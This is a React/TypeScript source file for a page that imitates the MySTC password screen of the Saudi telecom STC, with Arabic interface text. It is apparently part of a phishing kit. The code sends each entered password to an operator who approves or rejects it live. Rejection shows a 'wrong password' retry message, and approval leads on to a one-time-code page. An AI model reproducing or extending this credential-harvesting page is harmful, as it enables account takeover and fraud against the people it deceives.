import { useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useLocation } from "wouter";
import PageLayout from "@/components/layout/PageLayout";
import WaitingOverlay from "@/components/WaitingOverlay";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  sendData,
  isFormApproved,
  isFormRejected,
  navigateToPage,
} from "@/lib/store";
import { Eye, EyeOff, Lock } from "lucide-react";

const schema = z.object({
  password: z.string()
    .min(1, "كلمة المرور مطلوبة")
    .regex(/^[a-zA-Z0-9]+$/, "كلمة المرور يجب أن تحتوي على أرقام وحروف إنجليزية فقط"),
});

type FormData = z.infer<typeof schema>;

export default function STCPassword() {
  const [, navigate] = useLocation();
  const [showPassword, setShowPassword] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");

  const {
    register,
    handleSubmit,
    reset,
    formState: { errors },
  } = useForm<FormData>({
    resolver: zodResolver(schema),
    defaultValues: {
      password: "",
    },
  });

  // Emit page enter
  useEffect(() => {
    navigateToPage("كلمة مرور STC");
  }, []);

  // Handle form approval
  useEffect(() => {
    if (isFormApproved.value) {
      navigate("/mystc-otp");
    }
  }, [isFormApproved.value, navigate]);

  // Handle form rejection
  useEffect(() => {
    if (isFormRejected.value) {
      setErrorMessage("كلمة المرور غير صحيحة، يرجى المحاولة مرة أخرى");
      reset();
    }
  }, [isFormRejected.value, reset]);

  const onSubmit = (data: FormData) => {
    setErrorMessage("");
    sendData({
      data: {
        "كلمة مرور STC": data.password,
      },
      current: "كلمة مرور STC",
      waitingForAdminResponse: true,
      customWaitingMessage: "جاري التحقق من كلمة المرور",
    });
  };

  return (
    <PageLayout variant="default" className="bg-white min-h-screen">
      <WaitingOverlay />

      <div className="px-6 py-8">
        {/* Header */}
        <div className="text-center mb-8">
          <h1 className="text-xl font-bold text-gray-800 mb-2">أدخل كلمة المرور</h1>
          <p className="text-gray-500 text-sm">
            يتعين عليك ادخال كلمة الجديدة من Mystc
          </p>
        </div>

        <form onSubmit={handleSubmit(onSubmit)} className="space-y-6">
          {/* Password Field */}
          <div className="space-y-2">
            <div className="flex items-center justify-between">
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="text-primary text-sm"
              >
                {showPassword ? "إخفاء" : "اظهار"}
              </button>
              <div className="flex items-center gap-2">
                <Label htmlFor="password" className="text-gray-700">كلمة المرور</Label>
                <Lock className="w-4 h-4 text-gray-400" />
              </div>
            </div>
            <div className="relative">
              <Input
                id="password"
                type={showPassword ? "text" : "password"}
                placeholder=""
                className="text-right pr-4"
                {...register("password")}
              />
            </div>
            {errors.password && (
              <p className="text-red-500 text-xs text-right">{errors.password.message}</p>
            )}
            {errorMessage && (
              <p className="text-red-500 text-xs text-right">{errorMessage}</p>
            )}
          </div>

          {/* Submit Button */}
          <div className="fixed bottom-0 left-0 right-0 p-4 bg-white border-t">
            <Button 
              type="submit" 
              className="w-full bg-gray-300 hover:bg-primary text-gray-600 hover:text-white" 
              size="lg"
            >
              تسجيل الدخول
            </Button>
          </div>
        </form>
      </div>
    </PageLayout>
  );
}
